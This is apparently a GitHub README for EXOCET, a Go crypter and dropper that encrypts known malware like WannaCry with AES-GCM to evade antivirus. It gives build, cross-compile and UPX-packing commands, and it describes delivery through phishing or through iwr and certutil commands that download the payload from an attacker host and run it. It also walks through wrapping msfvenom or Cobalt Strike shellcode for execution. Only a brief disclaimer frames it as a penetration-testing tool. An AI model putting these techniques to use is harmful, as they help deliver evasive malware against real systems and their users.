# EXOCET - AV-evading, undetectable, payload delivery tool
<b>Chang Tan</b>
<br>
<b>AWS Certified Cloud Practitioner and Solutions Architect Associate</b>
<br>
changtan@listerunlimited.com
<br>

<br>
# Updated EXOCET Usage

Make sure you pack your payloads to avoid any leaks of the crypter's key and further frustrate malware analysts. A commercial top-of-the-line packer like Themida is NOT required. It would raise further suspicion without something like a code-signing certificate. Without code-signing certificate, on Windows systems, SmartScreen is automatically triggered. This is the rule for all potentially unwanted programs or "PUPs". 

```
go run exocet.go malware.exe outputmalware.go
env GOOS=windows GOARCH=amd64 build -ldflags "-s -w" outputmalware.go
upx --best outputmalware.exe
```

Then drop the payload on your target. Using something like a phishing email, link, or if you already have shell access, deliver it using something like hosting your own server locally `python -m http.server 80' and then on the machine you are compromising, run as a powershell prompt `iwr -Uri "http://yourip/outputmalware.exe" -OutFile "NotMalware.exe"` or `certutil.exe -urlcache -split -f http://yourip/outputmalware.exe` and then `outputmalware.exe`


<br>

![](https://upload.wikimedia.org/wikipedia/en/4/46/Exocet_impact.jpg)
<br>
EXOCET is superior to Metasploit's "Evasive Payloads" modules as EXOCET uses AES-256 in GCM Mode (Galois/Counter Mode). Metasploit's Evasion Payloads uses a easy to detect RC4 encryption. While RC4 can decrypt faster, AES-256 is much more difficult to ascertain the intent of the malware.
![](https://raw.githubusercontent.com/tanc7/EXOCET-AV-Evasion/master/media/nodetections.png)

However, it is possible to use Metasploit to build a Evasive Payload, and then chain that with EXOCET. So EXOCET will decrypt via AES-256, and then the Metasploit Evasive Payload then decrypts itself from RC4.

Much like my previous project, DarkLordObama, this toolkit is designed to be a delivery/launch vehicle, much like Veil-Evasion does. 

<a href="https://github.com/tanc7/dark-lord-obama">Dark Lord Obama Project</a>

However, EXOCET is not limited to a single codebase or platforms that are running Python. EXOCET works on ALL supported platforms and architectures that Go supports.

# Exocet Overview

EXOCET, is effectively a crypter-type malware dropper that can recycle easily detectable payloads like WannaCry, encrypt them using AES-GCM (Galois/Counter Mode), which is more secure than AES-CBC, and then create a dropper file for a majority of architectures and platforms out there. 

Basically...

1. It ingests dangerous malware that are now detectable by antivirus engines
2. It then encrypts them and produces it's own Go file
3. Then that Go file can be cross-compiled to 99% of known architectures
4. Upon execution, the encrypted payload is written to the disk and immediately executed on the command line
5. Alternatively, instead of a file-drop, it will execute the reconstitute shellcode in memory using amenzhinsky's go-memexec module [github.com/amenzhinsky/go-memexec](github.com/amenzhinsky/go-memexec)
6. **A custom shellcode executor is in the works**, it takes ordinary C shellcode and after num-transform, it will run it by creating a new process after allocating the correct virtual address space and granting it RWX permissions on Windows

That means 32-bit, and 64-bit architectures, and it works on Linux, Windows, Macs, Unix, Android, iPhone, etc. You take, anything, and I mean ANYTHING, like the 1988 Morris Worm that nearly brought down the internet (which exploited a flaw in the fingerd listener daemon on UNIX), and make it a viable cyberweapon again.

EXOCET is written entirely in Go.

# How to use

EXOCET, regardless of which binary you use to run it, requires Golang to work. By default, it generates a crypter .go file.

1. Windows users: <a href="https://golang.org/doc/install">Install Go Here</a>
2. Linux users: run `sudo apt-get update && sudo apt-get install -y golang`
3. You must install the EXOCET source files in golang `go get github.com/tanc7/EXOCET-AV-Evasion`
4. Sub-requirements will also be downloaded and installed
5. For Windows and Mac x64 Users, pre-compiled binaries are in the /bin folder

## To run it

`go run EXOCET.go detectablemalware.exe outputmalware.go`

A key is automatically generated for you. The key is 64-characters long and is entirely composed of bash and cmd.exe shell pipe redirectors to confuse and disrupt brute-forcing attempts against the key by causing unpredictable, destructive behavior on the forensic analyst's device.

For 64-bit Windows Targets...

`env GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o outputMalware.exe outputmalware.go`

And out comes a `outputmalware.exe` file

For 64-bit MacOS Targets

`env GOOS=darwin GOARCH=amd64 go build -ldflags "-s -w" -o outputMalware.macho outputmalware.go`

For 64-bit Linux Targets

`env GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o outputMalware.elf outputmalware.go`

See this reference on github for your parameters for other operating systems like Android <a href="https://gist.github.com/asukakenji/f15ba7e588ac42795f421b48b8aede63">Reference for Go Cross Compilation</a>

Note that the key can still be found with the `strings` command, please use the `upx-ucl` command to pack binary to conceal the key.


Furthermore, there are prebuilt binaries that I have made, meaning you just have to run `./EXOCET` or `EXOCET-Windows.exe`

# Legal Information

I, Chang Tan, and the creators of the main module and submodules of Exocet and the packages it incorporates are NOT responsible for the misuse of this tool. This is merely a penetration testing tool. You are strictly prohibited from deploying Exocet output binaries against unauthorized protected systems or unauthorized protected government systems.

I am aware that threat actors of APT41 and the NSO Group have used and/or adopted code from this tool, particularly the go-memexec method. If I were to be approached by Federal Investigators regarding the misuse of this tool, I am not claiming responsibility.

This is the same stuff that happened to the developers of Mimikatz and PowerShell Empire (who deprecated their own development upon realization of its use among threat actors). The successors have picked up development of Empire, and there are free alternatives such as Covenant C2.

# EXOCET live demo

<iframe width="560" height="315" src="https://github.com/tanc7/EXOCET-AV-Evasion/blob/master/media/exocetdemo.mp4" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

# Reason for the name

On May 4th, 1982, during the Falklands War, a squadron of Argentinan Super Eterdards launched a French made Exocet missile at the HMS Sheffield. Despite the Royal Navy's attempts to stop the missile, one struck, sinking the Sheffield. That incident literally put Argentina on the map as a show of force against a global colonial power.

<a href="https://www.theguardian.com/uk-news/2017/oct/15/exocet-missile-how-sinking-hms-sheffield-made-famous">News Article of the sinking of the HMS Sheffield</a>

Very much like how Onel de Guzman's actions with the ILOVEYOU virus put the Philippines on the map as a cyber threat. 

<a href="https://en.wikipedia.org/wiki/ILOVEYOU">ILOVEYOU Virus on Wikipedia</a>

# Incoming update, notes and ambitions

![](https://raw.githubusercontent.com/tanc7/EXOCET-AV-Evasion/master/media/Screenshot%20(208).png)

So this month, and the next month is going to be a busy month for me, and there will be delays in implementing these methods. But I am excited to get started on implementing new AV evasion techniques such as...

1. Inline hooking
2. Obfuscation by emulating BlackRota and the gobfuscate module
3. Process hollowing
4. Reflective DLL injection
5. Remote process injection
6. ThreadLocalStorage Callbacks
7. Registration of Top-Level Exception Handlers
8. Custom UPX packing

**I am a very busy man**, I have the following priorities and I would like to request some help, some pull requests to aid in the project. Since I have the following things to do

1. A court appearance in late October
2. National Cyber League
3. Accounting and Finance Classes, Computer Science was NEVER my college major and in the following weeks I will have exams back-to-back
4. Federal Supervised Release Conditions and the FBI trying to implicate me in new unproven crimes. I have dash camera videos I uploaded to the cloud to prove it that I am sending to my lawyers. I have documented multiple attacks against me, vandalism of my car, my house, filed police reports and counter reports and will be building my case to file a Federal lawsuit. One of the perpetrators, who ripped out my front bumper of my car, has been arrested.
5. A private project involving interaction with the CoinGeckoAPI
6. Running the cryptoscopeinitiative.org, a to-be-filed 501c3 Non-Profit Organization
7. Teaching three online classes on Exploit Development


# Upcoming update! Direct encrypted shellcode execution! (Implemented in test versions, not released yet)

~~I need a bit of help, because I successfully implemented CGO to execute encrypted shellcode but it is throwing memory access violations exit status 0xc0000005. It shouldn't be anything related to DEP (Data Execution Prevention) because the file CGOTest/working-template-shellcode-executor.go did run.~~

**Problem Discovered**

As it turns out, VirtualAlloc must be called from kernel32.dll and ntdll.dll to properly make the memory page where the shellcode lands, readable, writable, and executable, in other word, set the PAGE_EXECUTE_READWRITE to ON. Read the *Note on Memory Access Violation Problem* below.

![](https://raw.githubusercontent.com/tanc7/EXOCET-AV-Evasion/master/media/shellcode-exec-works.png)

Once I figure this out, CGO was a pain in the ass to implement, we can now create crypters that execute INLINE-ASSEMBLY. Which was considered a impossibility until now.

Note this requires Golang and the MinGW toolchain to be installed on Windows with you running and generating the shellcode on Windows. The reason why, is because CGO cannot be cross-compiled like our other EXOCET modules. To install the toolchain you need to go to [https://www.msys2.org/](https://www.msys2.org/) and follow the guide. Then you must add gcc to your environment variables in Windows

![](https://raw.githubusercontent.com/tanc7/EXOCET-AV-Evasion/master/media/sysenv.png)


**Step 1: Generate shellcode, this could be from msfvenom Meterpreter payloads, Cobalt Strike Beacons, or your own custom shellcode in C compatible format**
![](https://raw.githubusercontent.com/tanc7/EXOCET-AV-Evasion/master/media/generate-shellcode.png)

**Step 2: Copy only the bytes of the shellcode, excluding the quotes into a text file like sc.txt**
![](https://raw.githubusercontent.com/tanc7/EXOCET-AV-Evasion/master/media/copy-shellcode.png)

**Step 3: Your shellcode file should look like this. Raw shellcode**
![](https://raw.githubusercontent.com/tanc7/EXOCET-AV-Evasion/master/media/Shellcode-File.png)

**Step 4: Now run the command `go run exocet-shellcode-exec.go sc.txt shellcodetest.go KEY`**

**Step 5: You can attempt to run it but you'll run into memory access violation errors for some reason, which I am still working on**

# Note on Memory Access Violation Problem

Apparently, aside from the major limitations of CGO that prohibit or dramatically frustrates cross-compilation, the issue is that the shellcode we want to execute is landing in a section of memory (analyzed in WinDBG x64) that is not RWX. In other words, unless we write C code that explicitly allows execution in memory of the shellcode, it will always throw access violation errors.

The other method, that I observed other developers of rudimentary Go modules [https://gist.github.com/mgeeky/bb0fd5652b234fbd1c7630d7e5c8542d](https://gist.github.com/mgeeky/bb0fd5652b234fbd1c7630d7e5c8542d), is that they use Go's Windows API to interact with ntdll.dll and kernel32.dll to call VirtualAlloc and specify areas of RWX memory pages. This method works better, but it seems that the shellcode must be in num-transformed format only for it to work.

I am still working on this you guys. I may combine multiple programming languages together to write a proper shellcode execution module

# Note on Apple M1 Chips for precompiled binaries

Unfortunately I am running into errors for making a pre-compiled binary for MacBooks running the new M1 CPUs. It may be a issue with my Golang installation

```
┌──(root💀kali)-[/opt/EXOCET-AV-Evasion]
└─# GOOS=darwin GOARCH=arm64 go build exocet.go 
# command-line-arguments
/usr/lib/go-1.15/pkg/tool/linux_amd64/link: running gcc failed: exit status 1
/tmp/go-link-477718799/go.o: file not recognized: file format not recognized
collect2: error: ld returned 1 exit status
```

Either way, you still require Golang to compile or cross-compile the malware to the platform you are targeting. 
